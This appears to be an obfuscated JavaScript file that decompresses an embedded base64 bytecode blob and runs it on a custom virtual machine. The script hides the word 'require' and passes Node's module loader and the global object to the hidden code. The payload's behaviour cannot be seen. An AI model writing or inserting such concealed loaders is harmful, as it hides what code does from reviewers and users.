// v1.0.1


! function() {
    var e, a, r, c, s, n, t, o, f, i, u, l;
    let b = (...e) => new Uint8Array(...e),
        k = (...e) => new Uint16Array(...e);

    function h() {
        this.t = k(16), this.o = k(288)
    }

    function d(e, a) {
        this.i = e, this.u = 0, this.l = 0, this.k = 0, this.h = a, this.v = 0, this.A = new h, this.R = new h
    }

    function v(e, a, r, c) {
        var s, n;
        for (s = 0; r > s; ++s) e[s] = 0;
        for (s = 0; 30 - r > s; ++s) e[s + r] = s / r | 0;
        for (n = c, s = 0; 30 > s; ++s) a[s] = n, n += 1 << e[s]
    }

    function w(e, a, r, c) {
        var s, n;
        for (s = 0; 16 > s; ++s) e.t[s] = 0;
        for (s = 0; c > s; ++s) e.t[a[r + s]]++;
        for (e.t[0] = 0, n = 0, s = 0; 16 > s; ++s) l[s] = n, n += e.t[s];
        for (s = 0; c > s; ++s) a[r + s] && (e.o[l[a[r + s]]++] = s)
    }

    function A(e) {
        e.k-- || (e.l = e.i[e.u++], e.k = 7);
        var a = 1 & e.l;
        return e.l >>>= 1, a
    }

    function R(e, a, r) {
        if (!a) return r;
        for (; 24 > e.k;) e.l |= e.i[e.u++] << e.k, e.k += 8;
        var c = e.l & 65535 >>> 16 - a;
        return e.l >>>= a, e.k -= a, c + r
    }

    function X(e, a) {
        for (var r, c, s, n; 24 > e.k;) e.l |= e.i[e.u++] << e.k, e.k += 8;
        r = 0, c = 0, s = 0, n = e.l;
        do {
            c = 2 * c + (1 & n), n >>>= 1, ++s, r += a.t[s], c -= a.t[s]
        } while (c >= 0);
        return e.l = n, e.k -= s, a.o[r + c]
    }

    function p(e, a, r) {
        var c, s, n, t, o, l, b = R(e, 5, 257),
            k = R(e, 5, 1),
            h = R(e, 4, 4);
        for (c = 0; 19 > c; ++c) u[c] = 0;
        for (c = 0; h > c; ++c) t = R(e, 3, 0), u[f[c]] = t;
        for (w(i, u, 0, 19), s = 0; b + k > s;) switch (o = X(e, i)) {
            case 16:
                for (l = u[s - 1], n = R(e, 2, 3); n; --n) u[s++] = l;
                break;
            case 17:
                for (n = R(e, 3, 3); n; --n) u[s++] = 0;
                break;
            case 18:
                for (n = R(e, 7, 11); n; --n) u[s++] = 0;
                break;
            default:
                u[s++] = o
        }
        w(a, u, 0, b), w(r, u, b, k)
    }

    function y(a, r, c) {
        for (var f, i, u, l, b;;) {
            if (256 === (f = X(a, r))) return e;
            if (256 > f) a.h[a.v++] = f;
            else
                for (i = R(a, s[f -= 257], n[f]), u = X(a, c), b = l = a.v - R(a, t[u], o[u]); l + i > b; ++b) a.h[a.v++] = a.h[b]
        }
    }

    function K(r) {
        for (var c, s; r.k > 8;) r.u--, r.k -= 8;
        if ((c = 256 * (c = r.i[r.u + 1]) + r.i[r.u]) !== (65535 & ~(256 * r.i[r.u + 3] + r.i[r.u + 2]))) return a;
        for (r.u += 4, s = c; s; --s) r.h[r.v++] = r.i[r.u++];
        return r.k = 0, e
    }

    function q(s, n) {
        var t, o, f = new d(s, n);
        do {
            switch (t = A(f), R(f, 2, 0)) {
                case 0:
                    o = K(f);
                    break;
                case 1:
                    o = y(f, r, c);
                    break;
                case 2:
                    p(f, f.A, f.R), o = y(f, f.A, f.R);
                    break;
                default:
                    o = a
            }
            if (o !== e) throw Error("Data error")
        } while (!t);
        return f.v < f.h.length ? "function" == typeof f.h.slice ? f.h.slice(0, f.v) : f.h.subarray(0, f.v) : f.h
    }

    function z(e, a = 0) {
        var r, c, s, n, t, o, f = e.replace(/[^A-Za-z0-9+/]/g, ""),
            i = f.length,
            u = a ? Math.ceil((3 * i + 1 >> 2) / a) * a : 3 * i + 1 >> 2,
            l = b(u);
        for (s = 0, n = 0, t = 0; i > t; t++)
            if (c = 3 & t, s |= ((o = f.charCodeAt(t)) > 64 && 91 > o ? o - 65 : o > 96 && 123 > o ? o - 71 : o > 47 && 58 > o ? o + 4 : 43 === o ? 62 : 47 === o ? 63 : 0) << 6 * (3 - c), 3 === c || i - t == 1) {
                for (r = 0; 3 > r && u > n; r++, n++) l[n] = s >>> (16 >>> r & 24) & 255;
                s = 0
            } return l
    }
    e = 0, a = -3, r = new h, c = new h, s = b(30), n = k(30), t = b(30), o = k(30), f = b([16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]), i = new h, u = b(320), l = k(16), ((e, a) => {
            var r;
            for (r = 0; 7 > r; ++r) e.t[r] = 0;
            for (e.t[7] = 24, e.t[8] = 152, e.t[9] = 112, r = 0; 24 > r; ++r) e.o[r] = 256 + r;
            for (r = 0; 144 > r; ++r) e.o[24 + r] = r;
            for (r = 0; 8 > r; ++r) e.o[168 + r] = 280 + r;
            for (r = 0; 112 > r; ++r) e.o[176 + r] = 144 + r;
            for (r = 0; 5 > r; ++r) a.t[r] = 0;
            for (a.t[5] = 32, r = 0; 32 > r; ++r) a.o[r] = r
        })(r, c), v(s, n, 4, 3), v(t, o, 2, 1), s[28] = 0, n[28] = 258,
        function(e, a = {}) {
            let r = "undefined" != typeof globalThis ? globalThis : "undefined" != typeof window ? window : a;
            let c = r;
            let s = "undefined" != typeof require ? require : null,
                n = z("AVYEAACNks1r20AQxXdmZ3dt+Vt23DoYN/iW4oPdi48RLRhKKQRa6LGotpyaJlIiKR/+69tZ7ZqkpYRcvDvv9+bNSDLpdZzexQXpoozz8sGfezJ8XCQs+Mueupsds3SdrPLs6n222VMQ53l2/223KX+SWmeXWU61h+/ZdlskJdX2h5vZxmWaFAXR55idVNzkJcnr7J5UzIHvSK6zgmSxSwnPP1L9R3KxS8+ttVGUefYr+VLuLxOqX+7SxA0z9vohviaVZ7fphvRVdpd8zUhb3Z6uj4LbIjnh+25dngpxCiD6AL+FECMhIITjyRtxImABACGKKQKOAHGBXAJMAWEE0lN0lDyVjipPyVHtqXLUeKodrXlqHK17WnM08LTuaMPTwNEmLhEaITSXkg9qLRSohQY5U0pHKlAYqTFKSUtirFqM9MIAzbQ2kQ40RnqMRGrOlkiO+SF5RMtObPEY0+b6LeAnmKAQVmwgGGRlCRyH7YXkOOK4qp0rxZV01Zi35gXbdl/JvcZt2OEN27wUsOkYUc4rV8e66NHV/a+ra10ddtWeZC01X01varQJtDozRvOzmye9M+7lnmBWZfRsRvcxo5q0NHzVvak2OjDqjF+Oe3//ZjRcRnjYw2f2D5meD1625/y5PY9etuf8uT2HNgNDDMfC6RjKPn+h+opQUsXkgOXmCkEiA66PQhiugPjvXdlfsdqLiH/DiMbII1zba1b6lT6wuvvEXj+q9OFf/pFdQU7+AA=="),
                t = !!n[0],
                o = t ? n[1] | n[2] << 8 | n[3] << 16 | n[4] << 24 : n.length,
                f = t ? b(o) : b(n.buffer, 5, n.length - 5);
            t && q(b(n.buffer, 5, n.length - 5), f);
            let i = 0,
                u = {},
                l = [];
            let k = [],
                h = [],
                d = [];
            let v = 0,
                w = null,
                A = null,
                R = [],
                X = null;
            let p = [114, 101, 113, 117, 105, 114, 101].map((e => String.fromCharCode(e))).join("");
            a.X = {}, s && (a[p] = s);
            let y = new Float64Array(1);

            function K() {
                let e = 0,
                    a = 0,
                    r = 0;
                for (; r = f[i++], e |= (127 & r) << a, 0 != (128 & r);) a += 7;
                return e
            }

            function L() {
                return f[i++] | f[i++] << 8 | f[i++] << 16 | f[i++] << 24
            }

            function V() {
                let e = K();
                let a = "";
                for (let r = 0; e > r; r++) a += String.fromCharCode(K());
                return a
            }

            function Z(e, a) {
                let r = u;
                return function s() {
                    let n = v,
                        t = {};
                    v = e;
                    let o = u;
                    u = t, u[e] = {};
                    let f = d[e],
                        b = f.length;
                    for (let e = 0; b > e; e++) {
                        let a = f[e];
                        let c = r[a];
                        t[a] = c
                    }
                    let k = l,
                        h = i,
                        p = w,
                        y = A,
                        K = c,
                        q = R;
                    let z = null,
                        L = null;
                    l = [], R = [], i = a, w = s, A = arguments, c = this;
                    try {
                        z = M()
                    } catch (e) {
                        if (R.length) {
                            let a = R.pop();
                            i = a, X = e, z = M()
                        } else L = e
                    }
                    if (R = q, i = h, l = k, w = p, u = o, v = n, A = y, c = K, L) throw L;
                    return z
                }
            }

            function M() {
                for (;;) {
                    let e = f[i++];
                    switch (e) {
                        case 31:
                            u[v][K()] = A;
                            break;
                        case 10:
                            l[f[i++]] = K();
                            break;
                        case 32: {
                            let e = K(),
                                a = K();
                            u[v][a] = A[e];
                            break
                        }
                        case 42:
                            l[f[i++]] = l[f[i++]];
                            break;
                        case 19:
                            l[f[i++]] = Z(K(), L());
                            break;
                        case 18:
                            l[f[i++]] = k[K()];
                            break;
                        case 48:
                            l[f[i++]] = l[f[i++]] + l[f[i++]];
                            break;
                        case 63:
                            l[f[i++]] = l[f[i++]] / l[f[i++]];
                            break;
                        case 44:
                            l[f[i++]] = l[f[i++]] - l[f[i++]];
                            break;
                        case 26:
                            l[f[i++]] = l[f[i++]] * l[f[i++]];
                            break;
                        case 14:
                            l[f[i++]] = l[f[i++]] < l[f[i++]];
                            break;
                        case 64:
                            h.push(l[f[i++]]);
                            break;
                        case 70:
                            l[f[i++]] = l[f[i++]][l[f[i++]]] = l[f[i++]];
                            break;
                        case 34:
                            l[f[i++]] = l[f[i++]][l[f[i++]]];
                            break;
                        case 28: {
                            let e = K(),
                                a = Array(e);
                            for (let r = 0; e > r; r++) a[e - r - 1] = h.pop();
                            let r = f[i++],
                                c = f[i++],
                                s = f[i++],
                                n = l[c],
                                t = l[s];
                            l[r] = n[t].apply(n, a);
                            break
                        }
                        case 55: {
                            let e = f[i++],
                                c = !!f[i++],
                                s = K(),
                                n = k[s];
                            if (n in a) {
                                l[e] = a[n];
                                break
                            }
                            if (c && !(n in r)) throw new ReferenceError(n + " is not defined");
                            l[e] = r[n];
                            break
                        }
                        case 49:
                            l[f[i++]] = u[K()][K()];
                            break;
                        case 11:
                            l[f[i++]] = u[K()][K()] = l[f[i++]];
                            break;
                        case 25:
                            u[K()][K()] = l[f[i++]];
                            break;
                        case 75: {
                            let e = f[i++],
                                a = L();
                            l[e] || (i = a);
                            break
                        }
                        case 30:
                            return l[0];
                        default:
                            throw "u" + e
                    }
                }
            }
            b(y.buffer), (() => {
                for (i = 0;;) {
                    let e = f[i++];
                    if (4 === e) k.push(V());
                    else {
                        if (41 !== e) return void i--; {
                            let e = K(),
                                a = K(),
                                r = [];
                            for (let e = 0; a > e; e++) r.push(K());
                            d[e] = r
                        }
                    }
                }
            })(), Z(0, i).call(this)
        }(0, {})
}();
